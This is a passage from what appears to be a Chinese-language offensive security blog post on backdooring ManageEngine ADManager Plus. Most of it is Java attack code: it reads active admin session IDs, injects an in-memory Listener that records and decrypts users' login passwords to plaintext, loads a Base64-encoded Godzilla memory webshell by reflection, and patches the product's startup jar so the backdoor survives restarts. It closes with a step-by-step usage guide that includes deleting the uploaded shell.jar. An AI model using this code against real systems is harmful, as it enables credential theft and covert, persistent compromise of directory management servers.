}else if(isactive.equals("CLOSED")&& login_user.equals("admin")&&issuccess.equals("SUCCESS")&&Long.parseLong(rs.getString("logoff_time"))!=0L){
if(logoff_time <= Long.parseLong(rs.getString("logoff_time"))){
logoff_time = Long.parseLong(rs.getString("logoff_time"));
}else {
logoff_time = logoff_time;
sessions.put(logoff_time,rs.getString("session_id"));
}
}
}
Statement stmt1 = c.createStatement();
String sql = "UPDATE \"admphdtlogonaudit\" SET \"logon_status\" = 'ACTIVE' WHERE \"logoff_time\" = '"+logoff_time+"';";
stmt1.executeUpdate(sql);
c.commit();
String session = (String) sessions.get(logoff_time);
returnstr = returnstr+"ACTIVE admin Session:"+" "+session+"\r\n";
rs.close();
stmt.close();
}catch (Exception e){
e.printStackTrace();
}
return returnstr;
}
```  
  
  
获取session如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwcMYT8Ja3nVKcG3S13ibv0rxAsS0skIGibMg2ibOhhYqw9UgCibicrZOY0ibA/640?wx_fmt=png "")  
  
**6.明文密码记录**  
  
Zoho ADManager的登录认证是通过再web.xml中，调用Tomcat本身鉴权机制进行认证，核心代码在AuthenticatorBase 中，AuthenticatorBase再调用conf/server.xml中配置的Realm进行登录校验，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwZFSOov1NmxZyyRLOMoPXyfRChHgtoArg00vJVCtyuU7L2QpktuMa0g/640?wx_fmt=png "")  
  
也就是 com.adventnet.authentication.realm.CustomJAASRealm#authenticate方法  
  
所以说我们并没办法向内存中注入一个全局的Filter进行密码拦截，因为校验逻辑是在FIlter之前进行，且password字段在传入服务器时就已经是加密状态  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw1acj0TrknfNyjXbOMwo3aslfXXMUwHLgbbJibRdhSpOWvBx9QGAeibzw/640?wx_fmt=png "")  
  
      
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwibicjFBuJwnBDpQicnMlgBVjEuahffmWOM8wqrB58sHj4zt3r2XbEWd0A/640?wx_fmt=png "")  
  
到此，虽然数据库中存储的密码是哈希不可解密的，但是可以通过RSAKeyPairGenerator.getInstance().decrypt(password)方法获取到用户传入的参数实现密码解密  
  
既然Filter在登录验证之后，我们可以尝试Listener，经过分析，发现通过注入到内存中Listener可以成功拦截到传入的密码密文  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwG6aLBQCD7icoFL2M3KX1mepVSWFicgAtqpSXdjrkicibelpnkeybeG1FFg/640?wx_fmt=png "")  
  
内存中注入Listener代码逻辑如下：  
  
```
String godzillaMemShellClassBase64 = "yv66vgAAA";    
byte[] classBytes =  Base64.getDecoder().decode(godzillaMemShellClassBase64);
ClassLoader loader = Thread.currentThread().getContextClassLoader();
Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
defineClassMethod.setAccessible(true);
Class clazz = (Class) defineClassMethod.invoke(loader,classBytes,0,classBytes.length);
clazz.newInstance();
returnstr = "Start Record....";
```  
  
  
Listener核心代码记录逻辑将用户传入的username，password存储到类变量中，RecordPassword核心逻辑如下  
```
String username = getParameter(request,"j_username");
String password = getParameter(request,"j_password");
if(username!=null && password!=null){
userinfo.add(username+" "+ RSAKeyPairGenerator.getInstance().decrypt(password));
}
```  
  
相应的，存储明文密码后，对应的读取功能也就是读取内存中RecordPassword类的userinfo属性  
  
```
ClassLoader loader = Thread.currentThread().getContextClassLoader();
Class RecordPasswordclass = loader.loadClass("RecordPassword");
Field userinfofiled = RecordPasswordclass.getDeclaredField("userinfo");
userinfofiled.setAccessible(true);
ArrayList userinfo = (ArrayList)userinfofiled.get(RecordPasswordclass.newInstance());
           
Object tmp;
for(Iterator var6 = userinfo.iterator(); var6.hasNext(); returnstr = returnstr + tmp.toString() + "\r\n") {
tmp = var6.next();
}
```  
  
  
至此，成功实现了明文密码记录功能  
  
成功开始记录返回如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwajkISTtd3HCFI29xO1SicPxQtvjsJrA2BQGjFdxibtJJiaiakU2Y1d911g/640?wx_fmt=png "")  
  
获取记录的明文密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwEmMZeEZXlpwXdbf8nyXZ8icCXBWHQ8naL3R2Jg7xIMX7fBVzib5fB0aQ/640?wx_fmt=png "")  
  
**注入后门及持久化**  
  
运行时注入  
  
Zoho ADmanager并无jsp等支持动态解析文件，也无动态配置插件热加载功能，所以想要运行时注入后门逻辑，只能通过Java Agent技术动态修改已加载或者未加载的类，利用了这一特性使其动态修改特定类的特定方法，将我们的恶意后门逻辑添加到运行内存中  
  
启动后加载 agent 通过新的代理操作来实现：agentmain  
  
成功在内存中注入shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwa30TFTtDnETx2WHUPK30Eqh8UXJEk9EibDBYLiaTPlAOq5E2VfDoH7GQ/640?wx_fmt=png "")  
  
持久化后门留存  
  
通过Java Agent的方式作为运行时后门注入的解决方案，作为长期后门留存最好做到避免在文件系统新增恶意文件。  
  
我们ADManager的启动入口方法为  
```
com.adventnet.start.ProductTrayIcon#startAndRun，分析其启动调用栈
executeProgram:20, StartWebClient (com.adventnet.sym.adsm.start)
executeClass:165, ProductStarter (com.adventnet.start)
executeProcess:143, ProductStarter (com.adventnet.start)
startAndRun:82, ProductTrayIcon (com.adventnet.start)
main:236, ProductTrayIcon (com.adventnet.start)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
run:290, WrapperSimpleApp (org.tanukisoftware.wrapper)
run:748, Thread (java.lang)
```  
  
  
ADmanager每次启动时都会调用默认浏览器去访问登陆页面，com.adventnet.sym.adsm.start.StartWebClient#executeProgram  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwZnoxlckc7XGB6CoQ2e4TT5icKmhibFWUc0BB9ibv4BugicEGQR2SiaAAFyA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwe7LQACXNAkszFY72v8ILQYcEsDFNCwveCqJdnsXcLnTkUWxp9eP8Lw/640?wx_fmt=png "")  
  
选择修改executeProgram注入后门逻辑是很完美的位置，首先启动时注入后门符合注入时间点，其次应用整体功能已启动完毕，注入逻辑中需要的上下文context已经初始化完毕。  
  
综上所述，所以持久化的方式也就是替换com.adventnet.sym.adsm.start.StartWebClient#executeProgram所在的jar包AdventnetADSMStartUp.jar，  
  
修改后的executeProgram方法如下  
```
public void executeProgram(Properties additionalParams, String[] args) {
String confFileName = (String)additionalParams.get("client_startup_settings_filename");
if (confFileName != null) {
try {
Properties props = StartupUtil.getProperties(confFileName);
String launchClient = props.getProperty("LAUNCH_BROWSER_CLIENT");
if (launchClient != null && launchClient.equalsIgnoreCase("false")) {
props.setProperty("LAUNCH_BROWSER_CLIENT", "true");
StartupUtil.storeProperties(props, confFileName);
return;
}
} catch (Exception var12) {
logger.log(Level.INFO, "Caught exception while retrieving client parameter LAUNCH_BROWSER_CLIENT." + var12);
}
}
           
String command = (String)additionalParams.get("command");
String[] commandArray = command.split(" ");
ListcommandList = new ArrayList(Arrays.asList(commandArray));
String url = "https://";
int webPort = SDInstallUtil.getSSLPort();
if (webPort == -1) {
url = (String)commandList.get(commandList.size() - 1);
webPort = SDInstallUtil.getWebServerPort(additionalParams.getProperty("WebServerPortFileName"));
}
           
String launchClientIcon = (String)additionalParams.get("launchClient");
String hostName = StartupUtil.getProductDetails("HOST", (String)null);
hostName = hostName == null ? "localhost" : hostName;
url = url + hostName + ":" + (new Integer(webPort)).toString();
url = url + "/adminLogin";
commandList.remove(commandList.size() - 1);
commandList.add(url);
serverStartTime = System.currentTimeMillis();
           
try {
if (!StartupUtil.isRunningAsService(System.getProperty("product.home")) || launchClientIcon != null && launchClientIcon.equalsIgnoreCase("true")) {
(new ProcessBuilder(commandList)).start();
}
try {
//哥斯拉内存shell的class Base64
String godzillaMemShellClassBase64 = "yv66vgAAA";
byte[] classBytes =  Base64.getDecoder().decode(godzillaMemShellClassBase64);
ClassLoader loader = Thread.currentThread().getContextClassLoader();
Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
defineClassMethod.setAccessible(true);
Class clazz = (Class) defineClassMethod.invoke(loader,classBytes,0,classBytes.length);
clazz.newInstance();
}catch (Exception e){
           
}
           

```  
  
****  
**使用指南**  
  
1.上传shell.jar 向目标系统运行时注入后门  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwa30TFTtDnETx2WHUPK30Eqh8UXJEk9EibDBYLiaTPlAOq5E2VfDoH7GQ/640?wx_fmt=png "")  
  
后门注入成功，删除shell.jar  
  
2.持久化  
  
避免系统重启导致后门丢失，修改启动逻辑，替换AdventnetADSMStartUp.jar  
  
3.功能载荷  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwTWkYMiaaOichT9FzUFCEdUHejz6iaL8EnbiaUALZfqUIS2Gyib2A84PRrXw/640?wx_fmt=png "")  
  
4.流量  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw5JTibzCibLekCiaSf7wJQyHYoKibB0xZEEVdyYKaACCqyT9ckiabMa95pag/640?wx_fmt=png "")  
  
             
  
5.测试版本  
  
ManageEngine_ADManager_Plus_7222_64  
  
             
  
             
  
